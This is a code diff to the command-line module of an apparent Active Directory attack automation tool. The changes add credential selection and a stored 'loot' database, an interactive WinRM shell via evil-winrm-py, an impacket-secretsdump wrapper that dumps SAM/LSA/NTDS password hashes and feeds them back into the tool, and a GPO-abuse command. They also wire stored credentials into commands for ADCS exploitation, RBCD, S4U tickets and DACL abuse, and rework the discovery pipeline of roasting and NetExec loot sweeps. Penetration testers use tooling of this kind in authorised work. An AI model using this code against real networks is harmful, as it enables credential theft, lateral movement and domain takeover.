@@ -3,14 +3,15 @@
 
 import argparse
 import os
+import re
 import time
 import sys
 
 from .schema import DB, User, Hash, Box, Share, Vuln
 from .nxcwrap import Cred
-from .shell import have, stream
+from .shell import have, stream, run_stream
 from .store import Store
-from .console import info, good, err, warn, banner, Progress, start_logging
+from .console import info, good, err, warn, banner, plain, command, Progress, start_logging
 
 from . import recon as _recon
 from . import roast as _roast
@@ -53,6 +54,115 @@ def domain_creds(db: DB, password_only: bool = False) -> list[Cred]:
             cred._admin = is_admin  # type: ignore[attr-defined]
             chosen[name] = cred
     return list(chosen.values())
+
+
+def _default_domain(db: DB) -> str | None:
+    """The domain we'd attribute a hand-supplied credential to: the DC's."""
+    for dom in db._domains.values():
+        if dom.dc is not None:
+            return dom.name
+    return next((d.name for d in db._domains.values()), None)
+
+
+def _inject_cred(db: DB, domain_name: str, username: str, secret: str,
+                 is_hash: bool, kerberos: bool) -> Cred:
+    """Fold a supplied/stored credential into the in-memory DB so the whole
+    pipeline (domain_creds, sweep, adcs, ...) can see it, and return the nxc
+    Cred to drive authenticated enumeration with."""
+    dom = db.domain(domain_name)
+    anchor = dom.dc or (dom.boxes[0] if dom.boxes else None)
+    if anchor is not None:
+        usr = db.find_user(dom, username)
+        if usr is None:
+            usr = User(name=username, owner=anchor)
+            anchor.local_users[usr.name] = usr
+            db._users.append(usr)
+        if is_hash and usr.hash is None:
+            usr.hash = Hash(source="ntlm", hash=secret)
+        elif not is_hash and secret and usr.password is None:
+            usr.password = secret
+    return Cred(username=username, secret=secret, domain=domain_name,
+                is_hash=is_hash, kerberos=kerberos)
+
+
+def _stored_cred(db: DB, store: Store, username: str, domain: str | None,
+                 kerberos: bool) -> Cred | None:
+    """Find a stored credential for `username` (plaintext preferred over a bare
+    hash) and fold it in. Returns None if we hold nothing for that user."""
+    matches = [c for c in store.list_credentials(domain)
+               if c["username"].lower() == username.lower()]
+    if not matches:
+        return None
+    matches.sort(key=lambda c: c["is_hash"])     # plaintext (0) before hash (1)
+    c = matches[0]
+    return _inject_cred(db, c["domain"], c["username"], c["secret"],
+                        c["is_hash"], kerberos or c["kerberos"])
+
+
+def select_creds(db: DB, store: Store, args: argparse.Namespace) -> list[Cred]:
+    """Decide which credential(s) discover runs authenticated enum as.
+
+    Precedence:
+      1. a credential supplied on the command line (-u with -p/-H, or -u -k for
+         a ccache login): stored if new, and pinned as the current user.
+      2. -u alone: the matching stored credential.
+      3. the pinned 'current user' (see `config current-user`).
+      4. auto-pick: one best credential per domain (admin preferred), using a
+         plaintext password or an NTLM hash.
+    --kerberos forces Kerberos auth on whatever is chosen.
+    """
+    kerberos = bool(getattr(args, "kerberos", False))
+    user = getattr(args, "user", None)
+    password = getattr(args, "password", None)
+    nt_hash = getattr(args, "hash", None)
+
+    # 1. explicit credential supplied on the command line
+    if user and (password or nt_hash or kerberos):
+        domain = getattr(args, "domain", None) or _default_domain(db)
+        if not domain:
+            warn("supplied a credential but gave no --domain and no domain was "
+                 "discovered; skipping authenticated enumeration")
+            return []
+        is_hash = bool(nt_hash)
+        secret = nt_hash if is_hash else (password or "")
+        if secret:
+            store.add_credential(domain, user, secret, is_hash=is_hash, source="supplied",
+                                 kerberos=kerberos)
+        store.add_user(domain, user)
+        store.set_current_user(domain, user, kerberos)
+        kind = "hash" if is_hash else ("kerberos/ccache" if not secret else "password")
+        good(f"using supplied credential {domain}\\{user} ({kind}) [pinned as current user]")
+        return [_inject_cred(db, domain, user, secret, is_hash, kerberos)]
+
+    # 2. -u alone: the stored credential for that user
+    if user:
+        cred = _stored_cred(db, store, user, getattr(args, "domain", None), kerberos)
+        if cred:
+            good(f"using stored credential {cred.domain}\\{cred.username}")
+            return [cred]
+        warn(f"no stored credential for user {user!r}; auto-selecting instead")
+
+    # 3. the pinned current user
+    pinned = store.get_current_user()
+    if pinned:
+        cred = _stored_cred(db, store, pinned["username"], pinned["domain"],
+                            kerberos or pinned["kerberos"])
+        if cred:
+            good(f"using current user {cred.domain}\\{cred.username}"
+                 + (" (kerberos)" if cred.kerberos else ""))
+            return [cred]
+        warn(f"current user {pinned['domain']}\\{pinned['username']} has no stored "
+             "credential; auto-selecting instead")
+
+    # 4. auto-pick: highest-privilege credential per domain (password or hash),
+    #    inheriting the Kerberos flag stored on each credential
+    creds = domain_creds(db, password_only=False)
+    krb = {(c["domain"].lower(), c["username"].lower())
+           for c in store.list_credentials() if c["kerberos"]}
+    for c in creds:
+        if kerberos or ((c.domain or "").lower(), c.username.lower()) in krb:
+            c.kerberos = True
+    return creds
 
 
 def load_hosts(db: DB, store: Store) -> None:
@@ -182,65 +292,97 @@ def discover(args: argparse.Namespace) -> None:
             store.set_default_target(dc.hostname or dc.ip)
             good(f"default target set to {dc.hostname or dc.ip} (DC)")
 
-    for rnd in range(1, args.max_rounds + 1):
-        banner(f"discovery round {rnd}")
-        before = db.signature()
-
-        if args.userlist:
-            _kerbrute.userenum(db, args.userlist)
-
-        info("enumerating users (SMB null / guest + RID brute)")
-        _recon.enumerate_users(db, Cred.anonymous())
-        _recon.enumerate_users(db, Cred.guest())
-        info("enumerating shares (guest)")
-        _recon.enumerate_shares(db, Cred.guest())
-
-        info("enumerating password policy")
-        _recon.enumerate_password_policy(db, Cred.anonymous())
-        _recon.enumerate_password_policy(db, Cred.guest())
-
-        info("as-rep roasting")
-        _roast.asrep(db)
-        if crack:
-            _roast.crack_hashes(db, wordlist)
-
-        creds = domain_creds(db, password_only=True)
+    # ---- sweep-only: just the NetExec module sweep, skip everything else -----
+    # Handy once you already hold a privileged credential and only want the
+    # vuln/CVE/loot modules -- no re-enumeration, roasting, BloodHound, etc.
+    if args.vulns:
+        banner("netexec module sweep only")
+        creds = select_creds(db, store, args)
         if creds:
-            info(f"authenticated enumeration with {len(creds)} credential(s)")
+            info(f"sweeping as {len(creds)} credential(s): "
+                 + ", ".join(c.label() for c in creds))
+            # verify just these creds (sets admin_on) so loot modules can run
+            sel_users: list[User] = []
             for cred in creds:
-                _recon.enumerate_users(db, cred)
-                _recon.ldap_enumerate_users(db, cred)
-                _recon.enumerate_shares(db, cred)
-                _recon.enumerate_password_policy(db, cred)
-                info(f"kerberoasting as {cred.username}")
-                _roast.kerberoast(db, cred)
-            if crack:
-                _roast.crack_hashes(db, wordlist)
-
-        # one-shot BloodHound collection per domain (first valid cred)
-        _bloodhound.run_bloodhound(db)
-
-        info("verifying credentials (SMB validity, SMB/WinRM shells)")
-        _verify.verify_access(db)
-
+                dom = db.domain(cred.domain) if cred.domain else None
+                usr = db.find_user(dom, cred.username) if dom else None
+                if usr and usr not in sel_users:
+                    sel_users.append(usr)
+            if sel_users:
+                info("verifying the credential(s) (enables admin-only loot modules)")
+                _verify.verify_access(db, users=sel_users)
+        else:
+            info("no credential selected; sweeping with anonymous context only")
         info("sweeping NetExec vuln / CVE / loot modules")
         _modules.sweep(db)
+        db.report()
+        good(f"loot persisted to {store.dir}")
+        store.close()
+        return
 
-        for cred in domain_creds(db, password_only=True):
-            info(f"enumerating ADCS with certipy as {cred.username}")
-            _adcs.find(db, cred)
-            info("enumerating Kerberos delegation")
-            _delegation.find_delegation(db, cred)
+    # ---- unauthenticated discovery (runs once; resume-gated per context) ----
+    #
+    # No more re-scan rounds: the unauthenticated enum is done exactly once and
+    # its raw output is saved under the loot store. To pull in new findings
+    # with a credential, just re-run discover with -u/-p (or -u/-H) -- the
+    # resume markers make the already-done steps cheap no-ops.
+    banner("unauthenticated discovery")
+    if args.userlist:
+        _kerbrute.userenum(db, args.userlist)
 
+    info("enumerating users (SMB null / guest + RID brute)")
+    _recon.enumerate_users(db, Cred.anonymous())
+    _recon.enumerate_users(db, Cred.guest())
+    info("enumerating shares (guest)")
+    _recon.enumerate_shares(db, Cred.guest())
+
+    info("enumerating password policy")
+    _recon.enumerate_password_policy(db, Cred.anonymous())
+    _recon.enumerate_password_policy(db, Cred.guest())
+
+    info("as-rep roasting")
+    _roast.asrep(db)
+    if crack:
+        _roast.crack_hashes(db, wordlist)
+
+    # ---- choose the credential(s) for authenticated discovery ----------
+    creds = select_creds(db, store, args)
+
+    if creds:
+        banner("authenticated discovery")
+        info(f"authenticated enumeration with {len(creds)} credential(s): "
+             + ", ".join(c.label() for c in creds))
+        for cred in creds:
+            _recon.enumerate_users(db, cred)
+            _recon.ldap_enumerate_users(db, cred)
+            _recon.enumerate_shares(db, cred)
+            _recon.enumerate_password_policy(db, cred)
+            info(f"kerberoasting as {cred.username}")
+            _roast.kerberoast(db, cred)
         if crack:
             _roast.crack_hashes(db, wordlist)
-
-        if db.signature() == before:
-            good(f"round {rnd}: converged, no new findings")
-            break
-        info(f"round {rnd}: new findings discovered, re-scanning")
     else:
-        warn(f"stopped after max rounds ({args.max_rounds})")
+        info("no credentials available; skipping authenticated enumeration "
+             "(supply -u with -p or -H, pin one with `autowin config current-user`, "
+             "or add one with `autowin config cred add`)")
+
+    # one-shot BloodHound collection per domain (first valid cred)
+    _bloodhound.run_bloodhound(db)
+
+    info("verifying credentials (SMB validity, SMB/WinRM shells)")
+    _verify.verify_access(db)
+
+    info("sweeping NetExec vuln / CVE / loot modules")
+    _modules.sweep(db)
+
+    for cred in creds:
+        info(f"enumerating ADCS with certipy as {cred.username}")
+        _adcs.find(db, cred)
+        info("enumerating Kerberos delegation")
+        _delegation.find_delegation(db, cred)
+
+    if crack:
+        _roast.crack_hashes(db, wordlist)
 
     if args.timeroast and crack:
         info("timeroasting computer accounts")
@@ -326,34 +468,48 @@ def cred_add(args: argparse.Namespace) -> None:
         is_hash=is_hash,
         source="manual",
         host=args.host or "",
+        kerberos=args.kerberos,
     )
     store.add_user(args.domain, args.user)
+    krb = " (kerberos)" if args.kerberos else ""
     good(
-        f"stored credential {args.domain}\\{args.user} ({'hash' if is_hash else 'password'})"
+        f"stored credential {args.domain}\\{args.user} "
+        f"({'hash' if is_hash else 'password'}){krb}"
     )
 
     if args.force:
         store.close()
         return
 
-    # verify it works and note shell capability against a target
-    target = args.host or store.get_default_target()
-    if not target:
-        dc = next((h for h in store.list_hosts() if h["dc"]), None)
-        target = dc["hostname"] if dc else None
-    if target:
-        info(f"verifying {args.domain}\\{args.user} against {target}")
-        valid, shells = _verify.check_cred(args.domain, args.user, secret, is_hash, target)
-        store.set_cred_status(args.domain, args.user, valid or bool(shells),
-                              ",".join(sorted(shells)), target)
-        if shells:
-            good(f"valid; shell available via {', '.join(sorted(shells))}")
-        elif valid:
-            good("valid (no shell -- not admin / no WinRM)")
-        else:
-            warn("credential did NOT authenticate (stored anyway)")
+    # check whether this credential can get a shell, and say where -- across
+    # every known host (or just --host), so adding a user tells you its reach
+    if args.host:
+        hosts = [(args.host, args.host)]
     else:
-        warn("no target to verify against (pass --host or set a default target)")
+        rows = store.list_hosts()
+        dom = [h for h in rows if (h["domain"] or "").lower() == args.domain.lower()]
+        hosts = [(h["hostname"] or h["ip"], h["ip"]) for h in (dom or rows)]
+    if not hosts:
+        warn("no known hosts to check against (pass --host, or run discover first)")
+        store.close()
+        return
+
+    info(f"checking {args.domain}\\{args.user} for shell access on {len(hosts)} host(s)...")
+    any_valid, shells_by_host = _verify.check_cred_hosts(
+        args.domain, args.user, secret, is_hash, hosts, kerberos=args.kerberos)
+    all_shells = sorted({s for shells in shells_by_host.values() for s in shells})
+    shell_host = next(iter(shells_by_host), "")
+    store.set_cred_status(args.domain, args.user, any_valid or bool(shells_by_host),
+                          ",".join(all_shells), shell_host)
+    if shells_by_host:
+        for host, shells in shells_by_host.items():
+            good(f"{args.domain}\\{args.user} CAN get a shell on {host} "
+                 f"via {', '.join(sorted(shells))}")
+    elif any_valid:
+        good(f"{args.domain}\\{args.user} is valid, but cannot get a shell on any known host")
+    else:
+        warn(f"{args.domain}\\{args.user} did NOT authenticate on any of "
+             f"{len(hosts)} host(s) (stored anyway)")
     store.close()
 
 
@@ -366,6 +522,8 @@ def cred_list(args: argparse.Namespace) -> None:
     status = store.cred_status_map(args.domain)
     for c in rows:
         tag = "hash" if c["is_hash"] else "pass"
+        if c["kerberos"]:
+            tag += ", kerberos"
         have.add((c["domain"], c["username"]))
         st = status.get((c["domain"], c["username"]))
         note = ""
@@ -393,28 +551,238 @@ def cred_list(args: argparse.Namespace) -> None:
     store.close()
 
 
+def cred_rm(args: argparse.Namespace) -> None:
+    store = Store(args.loot_dir)
+    try:
+        secret, is_hash = None, None
+        if args.hash:
+            secret, is_hash = args.hash, True
+        elif args.password:
+            secret, is_hash = args.password, False
+
+        n = store.remove_credential(args.user, domain=args.domain,
+                                    secret=secret, is_hash=is_hash)
+        if n:
+            scope = f"{args.domain}\\{args.user}" if args.domain else args.user
+            good(f"removed {n} credential(s) for {scope}")
+        else:
+            warn(f"no stored credential matched {args.user}"
+                 + (f" in {args.domain}" if args.domain else ""))
+
+        # if the user now has no credentials left, drop its status and unpin it
+        remaining = [c for c in store.list_credentials(args.domain)
+                     if c["username"].lower() == args.user.lower()]
+        if not remaining:
+            store.remove_cred_status(args.user, args.domain)
+            cur = store.get_current_user()
+            if (cur and cur["username"].lower() == args.user.lower()
+                    and (not args.domain or cur["domain"].lower() == args.domain.lower())):
+                store.clear_current_user()
+                info("cleared the current user (its credential was removed)")
+    finally:
+        store.close()
+
+
+def current_user_cmd(args: argparse.Namespace) -> None:
+    """Show, set, or clear the credential discover uses by default."""
+    store = Store(args.loot_dir)
+    try:
+        if args.clear:
+            store.clear_current_user()
+            good("current user cleared")
+            return
+
+        domain = args.domain
+        user = args.user_opt
+        if args.user:                       # positional "DOMAIN\\user" or bare "user"
+            if "\\" in args.user:
+                domain, user = args.user.split("\\", 1)
+            else:
+                user = args.user
+
+        if not user:                        # no selection given -> show current
+            cur = store.get_current_user()
+            if cur:
+                tag = " (kerberos)" if cur["kerberos"] else ""
+                print(f"{cur['domain']}\\{cur['username']}{tag}")
+            else:
+                info("no current user set")
+            return
+
+        if not domain:
+            err(r"give a domain: `config current-user DOMAIN\user` or `-d DOMAIN -u USER`")
+            return
+
+        store.set_current_user(domain, user, args.kerberos)
+        store.add_user(domain, user)        # ensure it exists even with no cred yet
+        have = any(c["username"].lower() == user.lower()
+                   for c in store.list_credentials(domain))
+        good(f"current user set to {domain}\\{user}"
+             + (" (kerberos)" if args.kerberos else ""))
+        if not have:
+            warn("no credential stored for this user yet "
+                 "(add one with `autowin config cred add`, or pass -p/-H to discover)")
+    finally:
+        store.close()
+
+
 def _cred_from_args(args: argparse.Namespace) -> Cred:
-    """Build an nxc credential from the shared smb auth flags."""
+    """Build an nxc credential from the shared auth flags. Uses getattr so it
+    works for commands that don't define every flag (e.g. s4u has no -k)."""
     is_hash = bool(getattr(args, "hash", None))
-    secret = args.hash if is_hash else (args.password or "")
+    secret = getattr(args, "hash", None) if is_hash else (getattr(args, "password", None) or "")
     return Cred(
-        username=args.user or "",
+        username=getattr(args, "user", None) or "",
         secret=secret,
-        domain=args.domain,
+        domain=getattr(args, "domain", None),
         is_hash=is_hash,
-        kerberos=args.kerberos,
+        kerberos=bool(getattr(args, "kerberos", False)),
     )
+
+
+def _resolve_smb_domain(store: Store, target: str, user: str | None) -> str | None:
+    """Best domain for an SMB op when -d was omitted: the target host's domain,
+    else the domain of a stored credential for this user. Without it, smbclient
+    falls back to WORKGROUP and a domain account fails with LOGON_FAILURE."""
+    for h in store.list_hosts():
+        if target in (h["hostname"], h["ip"]) and h["domain"]:
+            return h["domain"]
+    if user:
+        for c in store.list_credentials():
+            if c["username"].lower() == user.lower() and c["domain"]:
+                return c["domain"]
+    return None
+
+
+def _cred_from_row(c: dict, kerberos: bool = False) -> Cred:
+    return Cred(c["username"], c["secret"], c["domain"],
+                is_hash=c["is_hash"], kerberos=c["kerberos"] or kerberos)
+
+
+def _stored_cred_for_user(store: Store, user: str, domain: str | None,
+                          kerberos: bool) -> Cred | None:
+    """The stored credential for `user` (plaintext preferred over a bare hash),
+    so specifying just a username never requires re-typing the secret."""
+    matches = [c for c in store.list_credentials(domain)
+               if c["username"].lower() == user.lower()]
+    if not matches:
+        return None
+    matches.sort(key=lambda c: c["is_hash"])
+    return _cred_from_row(matches[0], kerberos)
+
+
+def _default_smb_cred(store: Store, domain: str | None) -> Cred | None:
+    """The credential to use when none is named: the pinned current user, else
+    the best stored credential for the domain (shell > valid > plaintext)."""
+    cur = store.get_current_user()
+    if cur:
+        cred = _stored_cred_for_user(store, cur["username"],
+                                     cur["domain"], cur["kerberos"])
+        if cred:
+            return cred
+    creds = store.list_credentials(domain)
+    if not creds:
+        return None
+    status = store.cred_status_map(domain)
+    def rank(c):
+        st = status.get((c["domain"], c["username"]), {})
+        return (bool(st.get("shell")), bool(st.get("valid")), not c["is_hash"])
+    creds.sort(key=rank, reverse=True)
+    return _cred_from_row(creds[0])
+
+
+def _pick_smb_cred(store: Store, args: argparse.Namespace) -> Cred:
+    """Resolve the credential for a manual SMB op. Precedence:
+      1. --null            -> anonymous / null session
+      2. -u with -p/-H/-k  -> exactly what was given
+      3. -u alone          -> that user's stored credential (no password needed)
+      4. nothing named     -> pinned current user, else best stored credential
+    """
+    user = getattr(args, "user", None)
+    password = getattr(args, "password", None)
+    nt_hash = getattr(args, "hash", None)
+    kerberos = bool(getattr(args, "kerberos", False))
+    domain = getattr(args, "domain", None)
+
+    if getattr(args, "null", False):
+        return Cred.anonymous()
+    if user and (password or nt_hash or kerberos):
+        cred = _cred_from_args(args)
+        if not cred.kerberos:                       # inherit a Kerberos marking
+            stored = _stored_cred_for_user(store, user, cred.domain, False)
+            if stored and stored.kerberos:
+                cred.kerberos = True
+        return cred
+    if user:
+        return (_stored_cred_for_user(store, user, domain, kerberos)
+                or _cred_from_args(args))
+    return _default_smb_cred(store, domain) or Cred.anonymous()
+
+
+def _auth_line(cred: Cred) -> str:
+    """Human-readable 'who am I logging in as' for the console."""
+    if not cred.username:
+        return "anonymous / null session"
+    who = f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
+    secret = cred.secret or "<ccache>"
+    kind = "hash" if cred.is_hash else ("kerberos" if not cred.secret else "password")
+    tag = " +kerberos" if cred.kerberos and cred.secret else ""
+    return f"{who} : {secret} ({kind}{tag})"
+
+
+def _resolve_args_cred(store: Store, args: argparse.Namespace,
+                       target: str | None = None) -> Cred:
+    """Resolve a credential for any tool from the store, then write the result
+    back onto `args` so handlers that read args.user/password/hash/domain/
+    kerberos keep working. Same precedence as the SMB ops: an explicit
+    user+secret wins; a bare username pulls that user's stored secret; nothing
+    named falls back to the current user / best stored credential.
+
+    This is what makes "specify just a username (or nothing) and it uses the
+    stored cred" work across every command, not only `smb`.
+    """
+    # an AES key is a full secret the store doesn't hold -> treat as explicit
+    if getattr(args, "aes", None) and getattr(args, "user", None):
+        if not getattr(args, "domain", None) and target:
+            args.domain = _resolve_smb_domain(store, target, args.user) or args.domain
+        return Cred(args.user, "", getattr(args, "domain", None))
+
+    cred = _pick_smb_cred(store, args)
+    if cred.username and not cred.domain and target:
+        dom = _resolve_smb_domain(store, target, cred.username)
+        if dom:
+            cred.domain = dom
+
+    if hasattr(args, "user"):
+        args.user = cred.username or None
+    if cred.domain and hasattr(args, "domain"):
+        args.domain = cred.domain
+    if hasattr(args, "password"):
+        args.password = None if cred.is_hash else (cred.secret or None)
+    if hasattr(args, "hash"):
+        args.hash = cred.secret if cred.is_hash else getattr(args, "hash", None)
+    if hasattr(args, "kerberos"):
+        args.kerberos = cred.kerberos or bool(getattr(args, "kerberos", False))
+    return cred
 
 
 def smb_cmd(args: argparse.Namespace) -> None:
     store = Store(args.loot_dir)
     try:
         target = resolve_target(args.target, store, "target")
+        if target is None:
+            return
+        # fill the domain from the store so a domain account doesn't fall back
+        # to WORKGROUP (smbclient would fail with LOGON_FAILURE)
+        if not args.domain:
+            args.domain = _resolve_smb_domain(store, target, args.user)
+        cred = _pick_smb_cred(store, args)
+        if cred.username and not cred.domain and args.domain:
+            cred.domain = args.domain                # inherit the resolved domain
     finally:
         store.close()
-    if target is None:
-        return
-    cred = _cred_from_args(args)
+
+    info(f"authenticating to {target} as {_auth_line(cred)}")
     if args.smb_cmd == "shares":
         _smbops.list_shares(target, cred)
     elif args.smb_cmd == "shell":
@@ -515,6 +883,17 @@ def ticket_cmd(args: argparse.Namespace) -> None:
     if not have("impacket-getTGT"):
         err("ticket: impacket-getTGT not found on PATH (install impacket)")
         return
+    store = Store(args.loot_dir)
+    try:
+        _resolve_args_cred(store, args, target=args.dc_ip)
+    finally:
+        store.close()
+    if not args.user or not (args.password or args.hash or args.aes):
+        err("ticket: need a user and a secret (give -u/-p, -u/-H, --aes, or store a cred)")
+        return
+    if not args.domain:
+        err("ticket: domain unknown (pass -d, or set a current user)")
+        return
     authority = f"{args.domain}/{args.user}"
     cmd = ["impacket-getTGT"]
     if args.hash:
@@ -536,6 +915,17 @@ def s4u_cmd(args: argparse.Namespace) -> None:
     if not have("impacket-getST"):
         err("s4u: impacket-getST not found on PATH (install impacket)")
         return
+    store = Store(args.loot_dir)
+    try:
+        _resolve_args_cred(store, args, target=args.dc_ip)
+    finally:
+        store.close()
+    if not args.user or not (args.password or args.hash or args.aes):
+        err("s4u: need a user and a secret (give -u/-p, -u/-H, --aes, or store a cred)")
+        return
+    if not args.domain:
+        err("s4u: domain unknown (pass -d, or set a current user)")
+        return
     authority = f"{args.domain}/{args.user}"
     cmd = ["impacket-getST", "-spn", args.spn, "-impersonate", args.impersonate]
     if args.hash:
@@ -555,10 +945,18 @@ def dacl_cmd(args: argparse.Namespace) -> None:
     store = Store(args.loot_dir)
     try:
         host = resolve_target(args.dc, store, "DC")
+        if host is None:
+            return
+        cred = _resolve_args_cred(store, args, target=host)
     finally:
         store.close()
-    if host is None:
+    if not args.user or not (args.password or args.hash or args.kerberos):
+        err("dacl: need a user and a secret (give -u/-p, -u/-H, -k, or store a cred)")
         return
+    if not args.domain:
+        err("dacl: domain unknown (pass -d, or set a current user)")
+        return
+    info(f"bloodyAD on {host} as {_auth_line(cred)}")
     auth = _dacl._auth(args.domain, args.user, args.hash or args.password or "",
                        bool(args.hash), args.kerberos, host, args.dc_ip)
     me = args.user
@@ -620,14 +1018,42 @@ def logs_cmd(args: argparse.Namespace) -> None:
 
 
 
+def gpo_cmd(args: argparse.Namespace) -> None:
+    store = Store(args.loot_dir)
+    try:
+        _resolve_args_cred(store, args)
+    finally:
+        store.close()
+    if not args.user or not args.password:
+        err("gpo: need a user and password (-u/-p, or store a credential)")
+        return
+    if not args.domain:
+        err("gpo: domain unknown (pass -d, or set a current user)")
+        return
+    _gpo.gpo_abuse(args.domain, args.user, args.password, args.gpo_id,
+                   args.command, args.taskname)
+
+
 def adcs_cmd(args: argparse.Namespace) -> None:
     store = Store(args.loot_dir)
     try:
         dc = resolve_target(args.dc, store, "DC")
+        if dc is None:
+            return
+        cred = _resolve_args_cred(store, args, target=dc)
     finally:
         store.close()
-    if dc is None:
+    if not args.user or not args.password:
+        if args.user and (getattr(args, "hash", None) or getattr(args, "kerberos", False)):
+            err("adcs: this command needs a password (-p); hash/Kerberos isn't wired "
+                "for the certipy path here")
+        else:
+            err("adcs: need a user and password (-u/-p, or store a credential)")
         return
+    if not args.domain:
+        err("adcs: domain unknown (pass -d, or set a current user)")
+        return
+    info(f"certipy ADCS on {dc} as {_auth_line(cred)}")
     _adcs.exploit(
         args.domain, dc, args.user, args.password, args.target or dc,
         esc=args.esc, ca=args.ca, template=args.template, upn=args.upn,
@@ -638,15 +1064,143 @@ def rbcd_cmd(args: argparse.Namespace) -> None:
     store = Store(args.loot_dir)
     try:
         dc = resolve_target(args.dc, store, "DC")
+        if dc is None:
+            return
+        cred = _resolve_args_cred(store, args, target=dc)
     finally:
         store.close()
-    if dc is None:
+    if not args.user or not args.password:
+        err("rbcd: need a user and password (-u/-p, or store a credential)")
         return
+    if not args.domain:
+        err("rbcd: domain unknown (pass -d, or set a current user)")
+        return
+    info(f"RBCD on {dc} as {_auth_line(cred)}")
     _delegation.rbcd(
         args.domain, dc, args.user, args.password, args.target,
         computer=args.computer, computer_pass=args.computer_pass,
         impersonate=args.impersonate, clean=args.clean,
     )
+
+
+def shell_cmd(args: argparse.Namespace) -> None:
+    """Drop into an interactive WinRM shell via evil-winrm-py."""
+    if not have("evil-winrm-py"):
+        err("shell: evil-winrm-py not found on PATH (pipx install evil-winrm-py)")
+        return
+    store = Store(args.loot_dir)
+    try:
+        target = resolve_target(args.target, store, "target")
+        if target is None:
+            return
+        if not args.domain:
+            args.domain = _resolve_smb_domain(store, target, args.user)
+        cred = _resolve_args_cred(store, args, target=target)
+    finally:
+        store.close()
+    if not cred.username:
+        err("shell: no credential -- give -u (and it uses the stored secret), or "
+            "store one with `config cred add`")
+        return
+    info(f"evil-winrm shell to {target} as {_auth_line(cred)}")
+    cmd = ["evil-winrm-py", "-i", target, "-u", cred.username]
+    if cred.kerberos:
+        cmd += ["-k", "--no-pass"]
+    elif cred.is_hash:
+        cmd += ["-H", cred.secret]
+    elif cred.secret:
+        cmd += ["-p", cred.secret]
+    else:
+        cmd += ["--no-pass"]
+    stream(*cmd)
+
+
+_SECRET_LINE = re.compile(
+    r'^(?:(?P<dom>[^\\/:]+)[\\/])?(?P<user>[^:]+):(?P<rid>\d+):'
+    r'(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::'
+)
+
+
+def _harvest_secretsdump(store: Store, default_domain: str | None, output: str) -> int:
+    """Fold `user:rid:lm:nt:::` lines from secretsdump into the store as NTLM
+    credentials (+ the ntlm hash file), so they feed the crack/auth pipeline."""
+    n = 0
+    for line in output.splitlines():
+        m = _SECRET_LINE.match(line.strip())
+        if not m:
+            continue
+        domain = m.group("dom") or (default_domain or "")
+        user, nt = m.group("user"), m.group("nt")
+        if store.add_credential(domain, user, nt, is_hash=True, source="secretsdump"):
+            n += 1
+        store.add_user(domain, user)
+        store.add_hash(domain, user, "ntlm", nt)
+    return n
+
+
+def secretsdump_cmd(args: argparse.Namespace) -> None:
+    """Dump SAM/LSA/NTDS secrets from a host via impacket-secretsdump."""
+    if not have("impacket-secretsdump"):
+        err("secretsdump: impacket-secretsdump not found on PATH (install impacket)")
+        return
+    store = Store(args.loot_dir)
+    try:
+        target = resolve_target(args.target, store, "target")
+        if target is None:
+            return
+        if not args.domain:
+            args.domain = _resolve_smb_domain(store, target, args.user)
+        cred = _resolve_args_cred(store, args, target=target)
+        if not cred.username:
+            err("secretsdump: no credential -- give -u (uses the stored secret), "
+                "or store one with `config cred add`")
+            return
+
+        info(f"secretsdump on {target} as {_auth_line(cred)}")
+        authority = f"{cred.domain}/{cred.username}" if cred.domain else cred.username
+        cmd = ["impacket-secretsdump"]
+        if cred.kerberos:
+            cmd += ["-k", "-no-pass"]
+            spec = f"{authority}@{target}"
+        elif cred.is_hash:
+            cmd += ["-hashes", cred.secret if ":" in cred.secret else f":{cred.secret}"]
+            spec = f"{authority}@{target}"
+        elif cred.secret:
+            spec = f"{authority}:{cred.secret}@{target}"
+        else:
+            cmd += ["-no-pass"]
+            spec = f"{authority}@{target}"
+        if args.dc_ip:
+            cmd += ["-dc-ip", args.dc_ip]
+
+        # scope: default to just the domain Administrator; --all dumps everything
+        is_dc = any(h["dc"] and target in (h["hostname"], h["ip"])
+                    for h in store.list_hosts())
+        if args.just_dc_user:
+            cmd += ["-just-dc-user", args.just_dc_user]
+        elif args.all:
+            if is_dc:
+                cmd += ["-just-dc"]           # every NTDS account
+            info("dumping all secrets")
+        elif is_dc:
+            cmd += ["-just-dc-user", args.admin or "Administrator"]
+            info(f"dumping only {args.admin or 'Administrator'} (use --all for everything)")
+        else:
+            # not a DC: no DCSync, so dump this box's local SAM/LSA secrets
+            info("non-DC target: dumping local SAM/LSA secrets (use --all for everything)")
+        cmd.append(spec)
+
+        command("  " + " ".join(cmd))          # reproducible command
+        lines: list[str] = []
+        for line in run_stream(*cmd, timeout=args.timeout):
+            plain("  " + line)
+            lines.append(line)
+        out = "\n".join(lines)
+        store.save_output(cred.context(), f"secretsdump_{target}", " ".join(cmd), out)
+        n = _harvest_secretsdump(store, cred.domain, out)
+    finally:
+        store.close()
+    good(f"secretsdump complete; stored {n} NTLM credential(s) to the loot store")
 
 
 # ---- argument parsing -------------------------------------------------
@@ -680,11 +1234,27 @@ def read_args() -> argparse.Namespace:
         help="candidate username file to validate (kerbrute/netexec/nmap) and fold in",
     )
     d.add_argument(
-        "--loot-dir", default=DEFAULT_LOOT, help="persistent loot store directory"
+        "-u", "--user",
+        help="credential username for authenticated discovery (stored if new); "
+             "with no -p/-H it selects an already-stored credential for that user",
+    )
+    dgrp = d.add_mutually_exclusive_group()
+    dgrp.add_argument("-p", "--password", help="credential password")
+    dgrp.add_argument("-H", "--hash", help="credential NTLM hash (LM:NT or just the NT hash)")
+    d.add_argument(
+        "-d", "--domain",
+        help="credential domain (defaults to the discovered DC's domain)",
     )
     d.add_argument(
-        "--max-rounds", type=int, default=3, help="max discovery re-scan rounds"
+        "-k", "--kerberos", action="store_true",
+        help="authenticate over Kerberos (uses the ccache in KRB5CCNAME when no secret is given)",
     )
+    d.add_argument(
+        "--loot-dir", default=DEFAULT_LOOT, help="persistent loot store directory"
+    )
+    # deprecated: discovery no longer runs in re-scan rounds (re-run discover
+    # with a credential instead). Accepted silently so old commands don't break.
+    d.add_argument("--max-rounds", type=int, default=1, help=argparse.SUPPRESS)
     d.add_argument(
         "--exclude",
         default="",
@@ -695,6 +1265,9 @@ def read_args() -> argparse.Namespace:
         action="store_true",
         help="force a fresh network scan even if this range was scanned before",
     )
+    d.add_argument("--vulns", action="store_true",
+                   help="only run the NetExec vuln/CVE/loot module sweep (with the "
+                        "chosen credential) and skip all other enumeration")
     d.add_argument("--no-crack", action="store_true", help="skip hashcat cracking")
